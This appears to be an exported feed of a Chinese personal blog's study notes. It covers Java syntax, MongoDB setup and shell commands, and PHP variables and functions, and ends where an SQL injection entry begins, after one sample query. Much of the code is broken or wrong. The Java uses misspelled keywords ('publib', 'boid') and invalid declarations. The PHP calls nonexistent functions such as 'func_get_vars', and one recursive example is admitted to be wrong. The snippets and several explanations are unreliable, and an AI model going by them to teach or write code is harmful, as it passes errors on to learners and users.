<h2 id="导入包"><a href="#导入包" class="headerlink" title="导入包"></a>导入包</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Math.random <span class="comment">//静态导入包，导入后可以直接调用</span></span><br><span class="line">System.out.print(random());</span><br><span class="line"></span><br><span class="line"><span class="comment">//被final修饰的类不能被继承，该类存在内存的方法区中</span></span><br><span class="line">publib <span class="keyword">final</span> <span class="keyword">void</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;<span class="comment">//语句&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//被abstract修饰的类，抽象类可以有抽象方法和普通方法，有抽象方法的类必须是抽象类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Action</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span>; <span class="comment">//抽象方法，只有方法名，没有方法体。只是一个约束</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doanotherthing</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//普通方法</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//抽象类不能被用来直接创建对象，即不能使用new方法创建。</span></span><br><span class="line"><span class="comment">//子类在继承抽象类的时候，必须要重写抽象类的方法。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> run <span class="keyword">extends</span> <span class="title class_">Action</span>&#123;</span><br><span class="line">	<span class="meta">@override</span></span><br><span class="line">	<span class="keyword">public</span> boid <span class="title function_">dosomething</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//重写父类方法</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口中只有规范，自己无法写方法。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserServer</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>; <span class="comment">//public 与static 可以省略，默认为这来给你个修饰符</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TimeServer</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">time</span><span class="params">()</span>; <span class="comment">//public 与static 可以省略，默认为这来给你个修饰符</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServerImpl</span> <span class="keyword">implements</span> <span class="title class_">UserServer</span>,TimeServer&#123;</span><br><span class="line">	<span class="comment">//接口可以实现多继承</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//重写方法</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">time</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//重写方法</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>安全技术</category>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>Java语法</tag>
      </tags>
  </entry>
  <entry>
    <title>Mongodb</title>
    <url>/archives/20475214.html</url>
    <content><![CDATA[<h1 id="Mongodb"><a href="#Mongodb" class="headerlink" title="Mongodb"></a>Mongodb</h1><h1 id="数据库安装"><a href="#数据库安装" class="headerlink" title="数据库安装"></a>数据库安装</h1><p>安装完成后需要手动创建数据目录，但这个目录不会自动创建，需要手动创建，数据目录默认存储在dn目录下，最好创建在根目录下</p>
<p>cd d\</p>
<p>md “\data\db”</p>
<p>添加环境变量：将mongodb的安装目录下的bin目录添加到环境变量</p>
<p>mongod —dbpath d:\data\db &#x2F;&#x2F;指定数据目录</p>
<p>创建日志目录</p>
<p>cd d:\</p>
<p>mkdir d:\data\log</p>
<p>配置数据目录与日志目录</p>
<p>在mongodb的安装目录中创建mogod.cfg文件，向里面写入一下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemLog:</span><br><span class="line">    destination: file</span><br><span class="line">    path: d:\data\log\mongod.log</span><br><span class="line">storage:</span><br><span class="line">    dbPath: d:\data\db</span><br></pre></td></tr></table></figure>

<h1 id="安装mongodb服务"><a href="#安装mongodb服务" class="headerlink" title="安装mongodb服务"></a>安装mongodb服务</h1><p>mongod —config “d:\EXE\mongodb\mongodb.cfg” —install</p>
<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p><strong>启动服务</strong></p>
<p>net start mongodb</p>
<p><strong>停止服务</strong></p>
<p>net stop mongodb</p>
<p><strong>启动数据库</strong></p>
<p>mongod</p>
<p><strong>登录默认用户</strong></p>
<p>mongo</p>
<p><strong>账号用户名登录</strong></p>
<p>mongo —port 27017 -u admin -p yourpassword</p>
<p><strong>连接数据库</strong></p>
<p>连接一台服务器</p>
<p>mongodb:&#x2F;&#x2F;username:password@hostname:port&#x2F;[databasename][?options]</p>
<p>mongodb:&#x2F;&#x2F;host1,host2,host3&#x2F;?safe&#x3D;true;w&#x3D;2;wtimeoutMS&#x3D;2000</p>
<p>&#x2F;&#x2F;连接到三台服务器，并至少等待两台复制服务器写入成功，超时时间2s</p>
<p>mongodb:&#x2F;&#x2F;host1,host2,host3&#x2F;?connect&#x3D;direct,slaveOK&#x3D;true</p>
<p>&#x2F;&#x2F;直连到第一台服务器，不区分第一台服务器是主服务器还是从服务器</p>
<h1 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h1><p><strong>创建数据库</strong></p>
<p>use databasename &#x2F;&#x2F;使用数据库，如果数据库不存在则创建数据可</p>
<p><strong>查看当前数据库</strong></p>
<p>db</p>
<p><strong>查看所有数据库</strong></p>
<p>show dbs</p>
<p><strong>删除数据库</strong></p>
<p>db.dropDatabase()</p>
<p><strong>创建集合</strong></p>
<p>db.createCollection(name,option)</p>
<p>option: capped&#x3D;true 创建固定集合，有固定的大小，当达到最大值的时候自动覆盖最早的文档</p>
<p>size ,指定固定集合的最大值，字节</p>
<p>max,固定集合中包含文档的数量</p>
<p>集合不是必须创建的，执行</p>
<p>db.collectionname.insert()</p>
<p>当执行上述命令的时候，将自动创建集合</p>
<p>手动创建的集合必须在插入数据之后才会真正 生效。</p>
<p><strong>查看当前数据库中的集合</strong></p>
<p>show collections</p>
<p>show tables</p>
<p><strong>删除集合</strong></p>
<p>db.collectionname.drop()</p>
<p><strong>插入文档</strong></p>
<p>db.collectionname.insert({</p>
<p>“name”:”hjx”,</p>
<p>“age”:”25”</p>
<p>})</p>
<p>db.collectionname.insertOne({})</p>
<p>db.collectionname.insertMany([{}，{}],{</p>
<p>writeConcern:1 &#x2F;&#x2F;写入策略，1为要求确认写操作</p>
<p>ordered:true &#x2F;&#x2F;是否按顺序插入</p>
<p>})</p>
<p><strong>插入多个文档</strong></p>
<p>db.collectionname.save({}) &#x2F;&#x2F;如果指定了_id字段，则更新文档</p>
<p><strong>更新文档</strong></p>
<p>db.collection.update({条件}，{目标}，{</p>
<p>upsert:true &#x2F;&#x2F;如果不存在记录，是否插入</p>
<p>mutil: true &#x2F;&#x2F;是否更新所有匹配记录</p>
<p>writeConcern: &#x2F;&#x2F;抛出异常的级别</p>
<p>})</p>
<p><strong>删除文档</strong></p>
<p>db.collection.remove(</p>
<p>{条件},</p>
<p>{</p>
<p>justone: true &#x2F;&#x2F;是否只删除第一条匹配记录</p>
<p>writeConcern:</p>
<p>}</p>
<p>)</p>
<p>db.collectionanme.remove({}) &#x2F;&#x2F;删除所有文档</p>
<p><strong>查询文档</strong></p>
<p>db.collcetionname.find({条件}).pretty()</p>
<p>db.collectionname.findOne()</p>
<p>比较运算符</p>
<p>$lt</p>
<p>$gt</p>
<p>$lte</p>
<p>$gte</p>
<p>$ne</p>
<p>逻辑运算符</p>
<p>$or</p>
<p>db.collectionname.find({“name”:”何纪雄”,”age”:{$lt:30},$or:[{“gender”:”man”},{“gender”:””female}]}) <a href="//and">&#x2F;&#x2F;and</a> or</p>
<p>通过类型查询</p>
<p>db.collectionname.find({“name”:{$type:”string”}})</p>
<p>db.collectionname.find().limit(1)</p>
<p>db.collectionname.find().skip(1)</p>
<p>db.collectionname.find().sort({“key”:1}) <a href="//1">&#x2F;&#x2F;1</a> 升序 -1 降序</p>
<p>db.collectionname.createIndex({“keys”:1}) <a href="//1%E5%8D%87%E5%BA%8F">&#x2F;&#x2F;1升序</a> -1 降序</p>
<p><strong>聚合</strong></p>
<p>db.collectionname.aggregate([{$group:{_id:”$name”,别名:{$sum:”$字段”}}}])</p>
<p>$sum</p>
<p>$avg</p>
<p>$min</p>
<p>$max</p>
<p>$push &#x2F;&#x2F;将结果文档插入到一个数组中</p>
<p>$addToSet &#x2F;&#x2F;将结果文档插入到一个数组中，但不创建数组</p>
<p>$first &#x2F;&#x2F;获取结果文档按序排列的第一个文档</p>
<p>$last &#x2F;&#x2F;获取结构文档按序排列的最后一个文档</p>
<p><strong>管道</strong></p>
<p>$project</p>
<p>$match</p>
<p>$limit</p>
<p>$skip</p>
<p>$unwind</p>
<p>$group</p>
<p>$sort</p>
<p>$geoNear</p>
<p>db.collcetionname.aggregate([{管道1}，{管道2}])</p>
<h1 id="MongoDB复制"><a href="#MongoDB复制" class="headerlink" title="MongoDB复制"></a>MongoDB复制</h1><p>MongoDB复制是将数据同步在多个服务器的过程。</p>
<p>复制提供了数据的冗余备份，并在多个服务器上存储数据副本，提高了数据的可用性， 并可以保证数据的安全性。</p>
<p>复制还允许您从硬件故障和服务中断中恢复数据。</p>
<h2 id="复制原理"><a href="#复制原理" class="headerlink" title="复制原理"></a>复制原理</h2><p>mongodb的复制至少需要两个节点。其中一个是主节点，负责处理客户端请求，其余的都是从节点，负责复制主节点上的数据。</p>
<p>mongodb各个节点常见的搭配方式为：一主一从、一主多从。</p>
<p>主节点记录在其上的所有操作oplog，从节点定期轮询主节点获取这些操作，然后对自己的数据副本执行这些操作，从而保证从节点的数据与主节点一致。</p>
<h2 id="副本集设置"><a href="#副本集设置" class="headerlink" title="副本集设置"></a>副本集设置</h2><p><strong>以副本集的方式启动mongodb</strong></p>
<p>mongod —port 27017 —dbpath “dbfile_path” —replSet “副本集”&#x2F;&#x2F;副本集自行命名</p>
<p><strong>登录mongodb</strong></p>
<p>mongo -u admin -p password</p>
<p><strong>启动一个新的副本集</strong></p>
<p>rs.initiate()</p>
<p><strong>查看副本集的配置</strong></p>
<p>rs.conf()</p>
<p><strong>查看副本集的状态</strong></p>
<p>rs.status()</p>
<p><strong>向副本集中添加成员</strong></p>
<p>rs.add(172.14.12.34:27017)</p>
<p><strong>判断当前是否为主节点</strong></p>
<p>db.isMaster()</p>
<p>MongoDB的副本集与我们常见的主从有所不同，主从在主机宕机后所有服务将停止，而副本集在主机宕机后，副本会接管主节点成为主节点，不会出现宕机的情况。</p>
<h1 id="备份数据"><a href="#备份数据" class="headerlink" title="备份数据"></a>备份数据</h1><p>mongodump -h dbhost -d dbname -o backupdirectory</p>
<h1 id="恢复数据"><a href="#恢复数据" class="headerlink" title="恢复数据"></a>恢复数据</h1><p>mongorestore -h hostname:port -d dbname backup_data_path</p>
<p>查看mongodb运行状态</p>
<p>在命令行输入mongostat</p>
<p>查看mongodb集合的读写耗时</p>
<p>在命令行输入mongotop</p>
<h1 id="MongoDB关系"><a href="#MongoDB关系" class="headerlink" title="MongoDB关系"></a>MongoDB关系</h1><p>ongoDB 的关系表示多个文档之间在逻辑上的相互联系。</p>
<p>文档间可以通过嵌入和引用来建立联系。</p>
<p>MongoDB 中的关系可以是：</p>
<ul>
<li>1:1 (1对1)</li>
<li>1: N (1对多)</li>
<li>N: 1 (多对1)</li>
<li>N: N (多对多)</li>
</ul>
<p>接下来我们来考虑下用户与用户地址的关系。</p>
<p>一个用户可以有多个地址，所以是一对多的关系。</p>
<p>嵌入式关系</p>
<p>将数据直接嵌入到一个域中</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span>ObjectId(<span class="string">&quot;52ffc33cd85242f436000001&quot;</span>)<span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;contact&quot;</span><span class="punctuation">:</span> <span class="string">&quot;987654321&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;dob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;01-01-1991&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Tom Benzamin&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">         <span class="attr">&quot;building&quot;</span><span class="punctuation">:</span> <span class="string">&quot;22 A, Indiana Apt&quot;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;pincode&quot;</span><span class="punctuation">:</span> <span class="number">123456</span><span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;city&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Los Angeles&quot;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="string">&quot;California&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">         <span class="attr">&quot;building&quot;</span><span class="punctuation">:</span> <span class="string">&quot;170 A, Acropolis Apt&quot;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;pincode&quot;</span><span class="punctuation">:</span> <span class="number">456789</span><span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;city&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Chicago&quot;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Illinois&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>查询方法：db.users.findOne({“name”:”Tom Benzamin”},{“address”:1})</p>
<p>应用式关系</p>
<p>将文档的objectid浅入到域中</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span>ObjectId(<span class="string">&quot;52ffc33cd85242f436000001&quot;</span>)<span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;contact&quot;</span><span class="punctuation">:</span> <span class="string">&quot;987654321&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;dob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;01-01-1991&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Tom Benzamin&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;address_ids&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      ObjectId(<span class="string">&quot;52ffc4a5d85242602e000000&quot;</span>)<span class="punctuation">,</span></span><br><span class="line">      ObjectId(<span class="string">&quot;52ffc4a5d85242602e000001&quot;</span>)</span><br><span class="line">   <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这种方法需要两次查询</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&gt;var result = db.users.findOne(<span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Tom Benzamin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;address_ids&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span>)</span><br><span class="line">&gt;var addresses = db.address.find(<span class="punctuation">&#123;</span><span class="attr">&quot;_id&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$in&quot;</span><span class="punctuation">:</span>result<span class="punctuation">[</span><span class="string">&quot;address_ids&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>安全技术</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Mongodb</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP语法</title>
    <url>/archives/187503e5.html</url>
    <content><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h1 id="流程结构"><a href="#流程结构" class="headerlink" title="流程结构"></a>流程结构</h1><p><code>break 2</code>：后可接数字，表示跳出循环的级数；</p>
<h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p><code>a and b</code>: 将可能为false的值放在a的位置，以提高程序的运行速度；</p>
<p><code>a or b</code> 将可能为true的值放在a的位置</p>
<p>例：<code>a or ++a</code> 自增的运算符优先级高于<code>or</code>,一般考虑当a初始值为10 <code>a</code>为<code>true</code>的情况下，则运算后的结果a为11。实际上应为<code>a</code>为<code>true,</code>系统不对a进行自增，而是以结果为导向，<code>a</code>并不会参加运算，实际上运算结束后其值为10。</p>
<h1 id="HEREDOC"><a href="#HEREDOC" class="headerlink" title="HEREDOC"></a>HEREDOC</h1><p><img src="/archives/187503e5/Untitled.png"></p>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>定义在函数内部的变量为局部变量，局部变量不能在函数外部被访问，随着函数的结束而销毁</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$a</span>=<span class="number">4</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">//正常</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">//报错</span></span><br></pre></td></tr></table></figure>

<h2 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h2><p><code>static $a=1;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">static</span> <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$a</span>+=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>();<span class="comment">//$a==2</span></span><br><span class="line"><span class="title function_ invoke__">test</span>();<span class="comment">//$a==3</span></span><br></pre></td></tr></table></figure>

<p>静态变量再函数结束执行后从不会立即销毁，再下次调用该函数时静态变量中存储的值仍然有效，且静态变量只再第一次执行时声明。</p>
<h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>php所有得全局变量都存在与一个叫做$GLOBALS的数组总通过变量名可以访问该全局变量,要在函数中访问全局变量需要使用global关键字声明。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>]=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>]+<span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span> <span class="variable">$y</span>;</span><br><span class="line"><span class="comment">#输出结果x=3,y=2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SRATIC&quot;</span>,<span class="string">&quot;aramndhe&quot;</span>) <span class="comment">//常量大写</span></span><br></pre></td></tr></table></figure>

<h2 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h2><p><a href="%E9%A2%84%E5%AE%9A%E4%B9%89%E5%B8%B8%E9%87%8F%20b5c740a209d14e979cad2094d1486ade.csv">预定义常量</a></p>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="传参-应用传递与值传递"><a href="#传参-应用传递与值传递" class="headerlink" title="传参-应用传递与值传递"></a>传参-应用传递与值传递</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span>,&amp;<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$a</span>+=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$b</span>+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>,<span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>

<p>运算结束后<code>$a</code>的值仍然为10，<code>$b</code>的值为11。这就是php参数传递的两种不同模式，<code>$a</code>为值传递，再函数执行时，将<code>$a</code>的值复制一份到内存中生成一个新得值，此时函数中得<code>$a</code>相当于一个局部变量，参与函数的运算，故函数中的运算并不会对<code>$a</code>的原始值产生影响。而<code>&amp;$b</code>则指引用传递，再运算过程中<code>$b</code>的相当于将其内存地址传到了函数中，此时<code>$a</code>相当于全局变量，函数中对<code>$b</code>的改变相当于对其本身值得改变。</p>
<h2 id="不定长传参"><a href="#不定长传参" class="headerlink" title="不定长传参"></a>不定长传参</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">func_get_vars</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="number">12</span>,<span class="number">45</span>,<span class="number">565</span>);</span><br></pre></td></tr></table></figure>

<p><code>func_get_vars,</code>运算结束后将答应输入的所有实参的值，用以实现函数的不定长参数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">func_get_var</span>(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="number">12</span>,<span class="number">45</span>,<span class="number">565</span>);</span><br></pre></td></tr></table></figure>

<p><code>func_get_var</code>函数中传入形参的索引编号，获取对应索引的值。上例将会打印12。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">func_num_args</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="number">12</span>,<span class="number">45</span>,<span class="number">565</span>);</span><br></pre></td></tr></table></figure>

<p><code>func_num_args</code> ，获取自定义函数传入参数的数量。</p>
<h2 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">func_num_args</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="number">132</span>,<span class="number">56</span>,<span class="number">64</span>);</span><br></pre></td></tr></table></figure>

<p>可变函数，将函数作为一个对象赋值给一个变量。</p>
<h2 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h2><p>函数内部自己调用自己的函数被称为递归函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">avc</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$n</span>.<span class="string">&#x27;&amp;nbsp&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$n</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">avc</span>(<span class="variable">$n</span>-<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;---&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$n</span>.<span class="string">&#x27;&amp;nbsp&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">avc</span>(<span class="number">3</span>);    <span class="comment">////////这个函数写错了，我在这儿写蒙了....................</span></span><br></pre></td></tr></table></figure>

<h1 id="类型比较"><a href="#类型比较" class="headerlink" title="类型比较"></a>类型比较</h1><p><img src="/archives/187503e5/1791863413-572055b100304_articlex.png"></p>
<p><img src="/archives/187503e5/xxxxphp.png"></p>
<h1 id="数组函数"><a href="#数组函数" class="headerlink" title="数组函数"></a>数组函数</h1><p><a href="%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0%20c36bc961c2234b2f9955d25ff9d1f75a.csv">数组函数</a></p>
<h1 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h1><p><a href="%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%209e0dd38fb42c476fa07841c726018d3b.csv">字符串函数</a></p>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p><a href="%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%203ac58c6683e840f8b798762884e03849.csv">正则表达式</a></p>
<h1 id="日期与时间"><a href="#日期与时间" class="headerlink" title="日期与时间"></a>日期与时间</h1><p><a href="%E6%97%A5%E6%9C%9F%E4%B8%8E%E6%97%B6%E9%97%B4%20009dab6678b843d795c58fd0d31ab451.csv">日期与时间</a></p>
<h1 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h1><p><a href="%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%204a40796073364bba815921092123718f.csv">图像处理</a></p>
<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p><a href="%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%206c84a88d190340f7a6d6b7376b749978.csv">文件操作</a></p>
<h1 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h1><p><a href="%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%20ae156639101b4f0da055f9cd7d43d828.csv">上传文件</a></p>
<h1 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h1><p><a href="%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%20f402da2166bc4961bc505e65204939d5.csv">下载文件</a></p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>PHP语法</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/archives/e73517db.html</url>
    <content><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h1 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h1><h2 id="数字注入"><a href="#数字注入" class="headerlink" title="数字注入"></a>数字注入</h2><p><strong>查询语句</strong>：select * from table where id&#x3D;1</p>
<p><strong>构造语句</strong>：</p>
